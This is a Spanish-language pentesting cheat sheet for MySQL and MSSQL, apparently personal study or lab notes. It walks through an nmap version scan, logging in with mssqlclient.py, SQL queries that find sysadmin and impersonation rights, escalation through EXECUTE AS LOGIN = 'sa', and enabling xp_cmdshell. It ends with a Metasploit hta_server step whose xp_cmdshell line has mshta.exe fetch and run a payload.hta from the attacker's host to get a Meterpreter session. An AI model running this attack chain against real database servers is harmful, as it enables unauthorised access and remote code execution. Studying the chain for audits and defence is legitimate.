
### 📝 **Descripción**

MySQL y Microsoft SQL Server (MSSQL) son sistemas de gestión de bases de datos (DBMS). En auditorías de seguridad, es importante detectar versiones vulnerables y credenciales débiles que permitan acceso no autorizado.

### 🔍 **Puertos Comunes**

|Base de Datos|Puerto|
|---|---|
|MySQL|3306|
|MSSQL|1433|

### 🔎 **Escaneo de Nmap con Detección de Versión**
```bash
nmap -sV -p 1433 --script ms-sql-info ip
```
🛠️ **Comentario:** Este escaneo permite identificar la versión de MSSQL en la máquina objetivo. Si se encuentra una versión antigua, podría ser vulnerable a exploits conocidos.


### 🔑 **Autenticación a MSSQL**:

Si conocemos el usuario y la contraseña, podemos conectarnos con:
```bash
mssqlclient.py user:pass@ip
```

### 📌 **Comandos Útiles en SQL**

Una vez dentro de la base de datos, podemos ejecutar los siguientes comandos:

```sql
-- Ver la versión del sistema
SELECT @@version;

-- Obtener usuarios con permisos de sysadmin
SELECT loginname FROM syslogins WHERE sysadmin = 1;

-- Identificar usuarios con permisos de suplantación
SELECT DISTINCT b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';

-- Ver el usuario actual en sesión
SELECT system_user;

-- Intentar ejecutar comandos como otro usuario
EXECUTE AS LOGIN = 'sa';

-- Habilitar el uso de comandos del sistema
enable_xp_cmdshell

-- Ejecutar un comando en el sistema
EXEC xp_cmdshell "whoami";

```
🛠️ **Comentario:**

- **xp_cmdshell** permite ejecutar comandos en el sistema operativo desde SQL, pero suele estar deshabilitado por seguridad.
- El comando `EXECUTE AS LOGIN = 'sa'` permite cambiar de usuario si tenemos permisos.
- El comando `IMPERSONATE` podría permitirnos suplantar identidades si tenemos permisos suficientes.

### 🎯 **Explotación con Metasploit**

Podemos abrir una sesión de Metasploit utilizando un payload malicioso:

1️⃣ **Ejecutar el módulo en Metasploit**

```bash
use exploit/windows/misc/hta_server
set SRVHOST <tu_ip>
run
```

2️⃣ **Obtener la URL generada** y ejecutarla en MSSQL con el siguiente comando:

```sql
EXEC xp_cmdshell "mshta.exe http://tu_ip/payload.hta"
```
🛠️ **Comentario:**

- **mshta.exe** ejecuta scripts HTML maliciosos, lo que permite cargar un payload de **Meterpreter** o ejecutar código arbitrario.
- **Este ataque requiere que xp_cmdshell esté habilitado.** Si no lo está, hay que activarlo como se mostró antes.
